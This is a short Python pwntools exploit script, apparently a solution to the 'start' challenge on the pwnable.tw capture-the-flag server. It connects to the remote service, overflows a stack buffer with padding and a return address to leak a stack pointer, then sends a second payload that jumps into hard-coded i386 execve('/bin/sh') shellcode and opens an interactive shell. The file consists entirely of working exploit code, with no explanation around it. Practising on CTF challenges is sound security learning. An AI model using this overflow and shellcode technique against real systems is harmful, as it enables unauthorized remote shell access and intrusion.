#!/usr/bin/python
from pwn import *
context.log_level = 'debug'

#p = process('./start')
p = remote('chall.pwnable.tw',10000)
padding1 = 20 * 'a'
ret_addr = 0x08048087
#shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
#shellcode = asm(shellcraft.i386.linux.sh())
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"
payload = padding1 + p32(ret_addr)
p.recv()
p.send(payload)
leaf = u32(p.recv(4))
print hex(leaf)
print p.recv()
payload2 = padding1 + p32(leaf + 0x18)  + 4 * '\x90' +  shellcode
p.send(payload2)
p.interactive("\nshell#")


